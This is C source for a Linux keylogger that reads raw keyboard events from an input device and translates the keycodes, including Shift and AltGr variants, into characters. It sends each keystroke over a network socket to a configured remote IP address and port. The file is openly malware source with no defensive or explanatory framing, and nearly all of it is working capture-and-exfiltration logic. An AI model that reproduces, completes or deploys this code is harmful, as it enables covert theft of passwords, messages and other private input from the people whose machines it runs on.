#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>

#include "key.h"
#include "keylogger.h"
#include "network.h"

#define SHIFT(key) ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
#define ALTGR(key) (key == KEY_RIGHTALT)

static int running;
static int keyboard_fd;

static void sig_handler(int signo)
{
    running = 0;
}

void keylogger_init()
{
    signal(SIGINT, sig_handler);

    running = 1;

    if ((keyboard_fd = open(INPUT, O_RDONLY)) < 0)
    {
        fprintf(stderr, "\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }
}

void keylogger_exit(void)
{
    close(keyboard_fd);
}

const void keylogger()
{
    int sock = init_connection();
    struct sockaddr_in serv;
    char client_message[BUF_SIZE];

    memset(client_message, '\0', sizeof(client_message));

    serv.sin_family = AF_INET;
    serv.sin_port = htons(PORT);
    serv.sin_addr.s_addr = inet_addr(IP);

    int shift_flag = 0;
    int altgr_flag = 0;
    struct input_event event;

    while (running)
    {
        read(keyboard_fd, &event, sizeof(event));

        /* If a key from the keyboard is pressed */
        if (event.type == EV_KEY && event.value == 1)
        {
            if (SHIFT(event.code))
                shift_flag = event.code;
            if (ALTGR(event.code))
                altgr_flag = event.code;

            if (shift_flag && !altgr_flag && !SHIFT(event.code))
                strcpy(client_message, shifted_keycodes[event.code]);
            else if (!shift_flag && !altgr_flag && !SHIFT(event.code))
                strcpy(client_message, keycodes[event.code]);
            else if (!shift_flag && altgr_flag && !SHIFT(event.code))
                strcpy(client_message, alrgr_keycodes[event.code]);

            send_message(sock, serv, client_message);
        }
        else
        {
            /* If a key from the keyboard is released */
            if (event.type == EV_KEY && event.value == 0)
            {
                if (SHIFT(event.code))
                    shift_flag = 0;
                if (ALTGR(event.code))
                    altgr_flag = 0;
            }
        }
    }
}
